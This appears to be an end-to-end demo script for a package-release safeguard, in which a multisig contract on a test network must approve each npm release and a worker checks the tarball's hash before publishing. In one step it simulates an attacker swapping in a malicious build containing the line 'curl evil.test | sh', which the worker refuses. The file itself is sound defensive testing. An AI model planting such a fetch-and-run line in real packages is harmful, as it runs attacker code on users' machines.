// End to end demo against the deployed testnet contract and a local mock npm
// registry. It runs the real contract, the real CLI logic and the real worker
// binary. Only the registry is a mock.
//
//   node --env-file=.env cli/scripts/demo.mjs
//
// Needs: .env from setup-testnet.mjs, and the worker built (npm run build:worker).

import { existsSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { NearChain } from '../src/chain.mjs';
import * as cmd from '../src/commands.mjs';
import { startRegistry, totp } from '../../mock/registry.mjs';
import { makePackage } from '../../mock/tarball.mjs';
import { sha256 } from '../src/util.mjs';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const workerBin = path.join(root, 'worker/target/debug/keyturn-worker' + (process.platform === 'win32' ? '.exe' : ''));
if (!existsSync(workerBin)) throw new Error('build the worker first: npm run build:worker');

const need = (k) => process.env[k] || (() => { throw new Error(`${k} is missing in .env; run setup-testnet.mjs`); })();
const contractId = need('KEYTURN_CONTRACT');
const A = { ada: need('KEYTURN_ACCT_ADA'), bob: need('KEYTURN_ACCT_BOB'), cy: need('KEYTURN_ACCT_CY'),
  ci: need('KEYTURN_ACCT_CI'), worker: need('KEYTURN_ACCT_WORKER'), watch: need('KEYTURN_ACCT_WATCH') };
const as = (id) => new NearChain({ network: 'testnet', contractId, accountId: id, rpcUrl: process.env.KEYTURN_RPC });
const chain = Object.fromEntries(Object.entries(A).map(([k, id]) => [k, as(id)]));

const MOCK_BOT = 'mock-bot-token', MOCK_CI = 'mock-ci-token', MOCK_SECRET = 'GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ';
const reg = await startRegistry({ botToken: MOCK_BOT, ciToken: MOCK_CI, totpSecret: MOCK_SECRET });
const runWorker = cmd.runWorkerBinary(workerBin, {
  NPM_TOKEN: MOCK_BOT, NPM_TOTP_SECRET: MOCK_SECRET, KEYTURN_NPM_REGISTRY: reg.url,
});

const WINDOW_SECONDS = 20;
const project = `npm:demo-${Date.now().toString(36)}`;
const name = project.slice(4);
let failures = 0;

const step = (t) => console.log(`\n== ${t}`);
const say = (t) => console.log(`   ${t}`);
function check(ok, text) {
  console.log(`   ${ok ? 'PASS' : 'FAIL'}  ${text}`);
  if (!ok) failures++;
}
async function expectRefused(promise, text) {
  try {
    await promise;
    check(false, `${text} (it was accepted)`);
  } catch (e) {
    check(true, `${text}`);
    say(`contract said: ${String(e.message || e).split('\n')[0].slice(0, 110)}`);
  }
}
const sleep = (s) => new Promise((r) => setTimeout(r, s * 1000));
const statusOf = async (version) => (await chain.ada.view('get_release', { project_id: project, version }))?.status;

async function stageAndPropose(version, source) {
  const tarball = makePackage(name, version, source);
  const r = await fetch(`${reg.url}/-/mock/stage`, {
    method: 'POST',
    headers: { authorization: `Bearer ${MOCK_CI}` },
    body: JSON.stringify({ name, version, tarball: tarball.toString('base64') }),
  });
  const { id } = await r.json();
  await chain.ci.call('propose_release', { project_id: project, version, artifact_hash: sha256(tarball) });
  say(`CI staged ${name}@${version} on the registry and proposed hash ${sha256(tarball).slice(0, 16)}... to the contract`);
  return { id, tarball };
}

try {
  console.log(`contract ${contractId}\nproject  ${project}\nwindow   ${WINDOW_SECONDS}s (shortened for the demo)`);

  step('1. Register a project: 3 maintainers, 2 must approve, CI may only propose');
  await cmd.register(chain.ada, {
    project, registry: 'npm', members: [A.ada, A.bob, A.cy].join(','), proposers: A.ci,
    threshold: 2, windowHours: WINDOW_SECONDS / 3600,
  });
  say('registered');

  step('2. A hacked maintainer tries to ship alone');
  const v1 = await stageAndPropose('1.0.0', 'module.exports = "v1";\n');
  await expectRefused(chain.ci.call('approve_release', { project_id: project, version: '1.0.0' }), 'CI cannot approve its own proposal');
  await cmd.approve(chain.ada, { project, version: '1.0.0' });
  check((await statusOf('1.0.0')) === 'Proposed', 'one approval is not enough: release stays Proposed');
  await expectRefused(cmd.execute(chain.ada, { project, version: '1.0.0' }), 'execute is refused without a quorum');

  step('3. A second maintainer approves, the public window opens');
  await cmd.approve(chain.bob, { project, version: '1.0.0' });
  check((await statusOf('1.0.0')) === 'Pending', 'quorum reached: release is Pending');
  await expectRefused(cmd.execute(chain.watch, { project, version: '1.0.0' }), 'execute is refused while the window is open');
  say(`waiting ${WINDOW_SECONDS + 4}s for the window to close...`);
  await sleep(WINDOW_SECONDS + 4);

  step('4. Anyone triggers execution; the worker publishes only the approved bytes');
  await cmd.execute(chain.watch, { project, version: '1.0.0' });
  check((await statusOf('1.0.0')) === 'Executing', 'release is Executing');
  const r1 = await cmd.relay(chain.worker, { project, version: '1.0.0', stageId: v1.id, runWorker });
  check(r1.confirmed && (await statusOf('1.0.0')) === 'Released', 'worker published and the contract recorded it: Released');

  step('5. A consumer verifies what the registry serves');
  const ok = await cmd.verify(chain.ada, { project, version: '1.0.0', registryUrl: reg.url });
  check(ok.ok, `verify passes: ${ok.reason}`);

  step('6. A build is swapped after approval; the worker refuses it');
  const v2 = await stageAndPropose('1.0.1', 'module.exports = "v2";\n');
  await cmd.approve(chain.ada, { project, version: '1.0.1' });
  await cmd.approve(chain.cy, { project, version: '1.0.1' });
  say(`waiting ${WINDOW_SECONDS + 4}s for the window to close...`);
  await sleep(WINDOW_SECONDS + 4);
  await cmd.execute(chain.watch, { project, version: '1.0.1' });
  const evil = makePackage(name, '1.0.1', "require('child_process').exec('curl evil.test | sh');\n");
  await fetch(`${reg.url}/-/mock/tamper/${v2.id}`, { method: 'POST', body: JSON.stringify({ tarball: evil.toString('base64') }) });
  say('the attacker replaced the staged tarball after approval');
  const r2 = await cmd.relay(chain.worker, { project, version: '1.0.1', stageId: v2.id, runWorker });
  check(!r2.confirmed && r2.result.error === 'hash_mismatch', `worker refused: ${r2.result.error}`);
  check(!reg.isPublished(name, '1.0.1'), 'nothing was published to the registry');
  check((await statusOf('1.0.1')) === 'Executing', 'the contract never recorded a publication');
  const bad = await cmd.verify(chain.ada, { project, version: '1.0.1', registryUrl: reg.url });
  check(!bad.ok, `verify fails: ${bad.reason}`);

  step('7. The quorum recalls a published release');
  await cmd.recall(chain.ada, { project, version: '1.0.0' });
  await cmd.recall(chain.bob, { project, version: '1.0.0' });
  check((await statusOf('1.0.0')) === 'Recalled', 'release is Recalled');
  const recalled = await cmd.verify(chain.ada, { project, version: '1.0.0', registryUrl: reg.url });
  check(!recalled.ok, `verify now fails: ${recalled.reason}`);
} finally {
  await reg.close();
}

console.log(failures === 0 ? '\nALL CHECKS PASSED' : `\n${failures} CHECK(S) FAILED`);
process.exit(failures === 0 ? 0 : 1);
